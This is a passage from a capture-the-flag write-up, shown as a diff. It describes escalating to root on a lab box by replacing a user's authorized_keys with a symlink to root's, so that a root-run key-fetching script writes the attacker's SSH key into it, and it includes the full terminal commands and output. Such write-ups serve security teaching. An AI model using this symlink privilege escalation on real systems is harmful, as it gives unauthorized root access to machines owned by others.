@@ -221,4 +221,47 @@ ETSCTF@etceterad:~$ id
 uid=1000(ETSCTF) gid=1000(ETSCTF) groups=1000(ETSCTF)
 ```
 
-We
+We can do a little experiment to see what's goin on here. Since we now have access as the `ETSCTF` user, we can delete the file and re-run the `/usr/local/sbin/fetch_keys` script.
+
+```
+ETSCTF@etceterad:~/.ssh$ rm authorized_keys 
+rm: remove write-protected regular file 'authorized_keys'? y
+ETSCTF@etceterad:~/.ssh$ ls -la
+total 20
+drwxr-xr-x 1 ETSCTF ETSCTF 4096 Oct 11 12:00 .
+drwxr-xr-x 1 ETSCTF ETSCTF 4096 Mar 26  2024 ..
+-r-------- 1 root   root    565 Oct 11 12:00 authorized_keys
+```
+
+We observe that a new file is written to disk as the root user. After thinking and experimenting about this for some time we realize that any file with the name `authorized_keys` in the `/home/ETSCTF/.ssh/` is overwritten by the root user when `/usr/local/sbin/fetch_keys` is run.
+
+We can leverage this by using a symlink which points to the `authorized_keys` file under the `/root/.ssh/` directory to overwrite the root user's ssh public keys. After doing that we can ssh into the machine using our private key as the root user.
+```
+ETSCTF@etceterad:~/.ssh$ rm authorized_keys 
+rm: remove write-protected regular file 'authorized_keys'? y
+ETSCTF@etceterad:~/.ssh$ ln -s /root/.ssh/authorized_keys authorized_keys
+ETSCTF@etceterad:~/.ssh$ ls -la
+total 16
+drwxr-xr-x 1 ETSCTF ETSCTF 4096 Oct 11 12:06 .
+drwxr-xr-x 1 ETSCTF ETSCTF 4096 Mar 26  2024 ..
+lrwxrwxrwx 1 ETSCTF ETSCTF   26 Oct 11 12:06 authorized_keys -> /root/.ssh/authorized_keys
+```
+
+After this we run the `/usr/local/sbin/fetch_keys` script and `/root/.ssh/authorized_keys` gets overwritten with our public ssh key.
+
+We can now login to the box as the root user.
+Voila :smiley: :sparkles:.
+```
+mcsam@0x32:~/$ ssh -i id_rsa root@10.0.160.122
+Linux etceterad.echocity-f.com 4.19.0-25-amd64 #1 SMP Debian 4.19.289-2 (2023-08-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@etceterad:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@etceterad:~#
+```
